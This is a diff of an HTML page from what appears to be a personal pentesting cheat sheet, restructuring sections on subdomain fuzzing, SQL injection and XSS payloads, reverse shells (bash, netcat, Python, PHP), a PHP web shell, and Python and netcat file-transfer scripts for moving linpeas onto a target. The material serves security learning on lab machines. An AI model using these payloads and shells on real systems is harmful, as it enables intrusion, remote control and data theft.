@@ -30,22 +30,25 @@
                 <h1 id="Enumeration">Enumeration</h1>
             </div>
             <h2> Virtual Host (Subdomain) Enumeration</h2>
-            <p> In some cases it would be necessary to enumrate subdomains so we can use wfuzz. We use --hl 234 (Which is the code) in case there are multiple request with the same code </p>
-            <pre><code class="language-bash"> wfuzz -c --hc 404 -t 200 --hl 234 -w /usr/share/wordlists/dirb/small.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"</code></pre>
-            <p> In case that the server responds equally for real subdomains and for not real subdomains we can use the following script that compare the hash of the requests to identify possible true subdomains </p>
-            
-            <a class="cherry-banner" href="/H4ckV4ult/files/subdomainLister.sh" download="subdomainLister.sh">
-                <img src="/H4ckV4ult/images/file_logo.png"> 
-                <h3>SubdomainLister.sh</h3>
-            </a>
+            <ul>
+                <p> In some cases it would be necessary to enumrate subdomains so we can use wfuzz. We use --hl 234 (Which is the code) in case there are multiple request with the same code </p>
+                <pre><code class="language-bash"> wfuzz -c --hc 404 -t 200 --hl 234 -w /usr/share/wordlists/dirb/small.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"</code></pre>
+                <p> In case that the server responds equally for real subdomains and for not real subdomains we can use the following script that compare the hash of the requests to identify possible true subdomains </p>
+                
+                <a class="cherry-banner" href="/H4ckV4ult/files/subdomainLister.sh" download="subdomainLister.sh">
+                    <img src="/H4ckV4ult/images/file_logo.png"> 
+                    <h3>SubdomainLister.sh</h3>
+                </a>
+            </ul>
            
 
             <div class="notion-header">
-                <h1 id="OWASP TOP 10">OWASP TOP 10</h1>
+                <h1 id="OWASP TOP 10">OWASP TOP 10</h1>   
             </div>
                 <!-- SQL injection -->
                 <div class="notion-body">
                     <h2>SQL injection</h2>
+                    <ul>
                         <p> Basic payloads</p>
                         <pre><code class="language-sql">'+OR+1=1--
 ' OR 1=1; --
@@ -83,98 +86,103 @@
                 no error would mean that this parameter is injectable   
                 <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
                
-                
+                </ul>
                 <!-- XSS -->    
                 </div>
                 <div class="notion-body">
                     <h2>XSS</h2>
-                    <h3>Links of interes</h3>
                     <ul>
-                        <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
-                        <li> <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"> Payload all the things</a></li>
-                    </ul>
-                    
-                    <h3>Common payloads</h3>
-                    <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
-                    <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
-                    <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>
-                    
-                    <h3>Situations</h3>
-                    
-                    In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
-                    Here what has been done is to close the select and inject the code there.
-                    <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>
+                        <h3>Links of interes</h3>
+                        <ul>
+                            <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
+                            <li> <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"> Payload all the things</a></li>
+                        </ul>
+                        
+                        <h3>Common payloads</h3>
+                        <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
+                        <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
+                        <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>
+                        
+                        <h3>Situations</h3>
+                        
+                        In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
+                        Here what has been done is to close the select and inject the code there.
+                        <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>
 
-                    <p> Avoiding WAF</p>
-                    In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
+                        <p> Avoiding WAF</p>
+                        In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
+                    </ul>
                 </div>
             
-            <div class="notion-header">
-                <h1 id="Webshells">Webshells</h1>
-                <ul>
-                    <li> <a class="notion-link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"> Pentest Monkey - Webshells</a></li>
-                </ul>
-                <h2>Bash</h2>
-                <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
-                <pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
-                <h2>Python</h2>
-                <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))</code></pre>
-                <h2>PHP</h2>
-                <pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
-                <pre><code class="language-php">&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.80/1234 0&gt;&amp;1'&quot;); ?&gt;
-</code></pre>
-
-            </div>    
+                <div class="notion-header">
+                    <h1 id="Webshells">Webshells</h1>
+                </div>
+                
+                <div class="notion-body">
+                    <ul>
+                        <a class="notion-link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"> Pentest Monkey - Webshells</a></li>
+                        <h2>Bash</h2>
+                        <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
+                        <pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
+                        <h2>Python</h2>
+                        <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))</code></pre>
+                        <h2>PHP</h2>
+                        <pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
+                        <pre><code class="language-php">&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.80/1234 0&gt;&amp;1'&quot;); ?&gt;</code></pre>
+                    </ul>
+                </div>
+                
                 
             <div class="notion-header">
                 <h1 id="Python">Python</h1>
-                <h2> Upgrade terminal </h2>
-                <pre><code class="language-python">python -c 'import pty; pty.spawn("/bin/bash")'</code> </pre>
-                <pre><code class="language-python">script /dev/null -c bash</code> </pre>
-                
-                <h2> File transfer with Python </h2>
-                <h3> Server </h3>
-                <pre><code class="language-python">python3 -c "
-import socket
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
-    server_socket.bind(('10.8.0.22', 7777))
-    server_socket.listen(1)
-    conn, addr = server_socket.accept()
-    print(f'Conexión desde {addr}')
-    with conn, open('/home/kali/github/file.sh', 'rb') as file:
-        while (data := file.read(1024)):
-            conn.sendall(data)
-    print('Archivo enviado con éxito.')"</code></pre>
-                <h3> Client </h3>
-                <pre><code class="language-python">python3 -c "
-import socket
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-    client_socket.connect(('10.8.0.22', 7777))
-    print('Conectado al servidor.')
-    with open('/var//linpeas.sh', 'wb') as file:
-        while True:
-            data = client_socket.recv(1024)
-            if not data:
-                break
-            file.write(data)
-    print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
             </div>
+            <div class="notion-body">
+                <ul>    
+                    <h2> Upgrade terminal </h2>
+                    <pre><code class="language-python">python -c 'import pty; pty.spawn("/bin/bash")'</code> </pre>
+                    <pre><code class="language-python">script /dev/null -c bash</code> </pre>
+                    
+                    <h2> File transfer with Python </h2>
+                    <h3> Server </h3>
+                    <pre><code class="language-python">python3 -c "
+    import socket
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+        server_socket.bind(('10.8.0.22', 7777))
+        server_socket.listen(1)
+        conn, addr = server_socket.accept()
+        print(f'Conexión desde {addr}')
+        with conn, open('/home/kali/github/file.sh', 'rb') as file:
+            while (data := file.read(1024)):
+                conn.sendall(data)
+        print('Archivo enviado con éxito.')"</code></pre>
+                    <h3> Client </h3>
+                    <pre><code class="language-python">python3 -c "
+    import socket
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+        client_socket.connect(('10.8.0.22', 7777))
+        print('Conectado al servidor.')
+        with open('/var//linpeas.sh', 'wb') as file:
+            while True:
+                data = client_socket.recv(1024)
+                if not data:
+                    break
+                file.write(data)
+        print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
+                </div>
 
             <div class="notion-header"> 
                 <h1 id="Netcat">Netcat</h1>
-                <h2> Transfer files </h2>
-                <p>Where you recieve the file</p>
-                <pre><code class="language-python">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
-                <p>From where you transfer the file</p>
-                <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
-
-
-                
-                
             </div>
-
             
-        </div>
+            <div class="notion-body">
+                <ul>
+                    <h2> Transfer files </h2>
+                    <p>Where you recieve the file</p>
+                    <pre><code class="language-python">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
+                    <p>From where you transfer the file</p>
+                    <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
+                </ul>
+            </div>               
     </div>
 
     <!-- Mover el script al final del body para asegurar que todo el DOM esté cargado -->
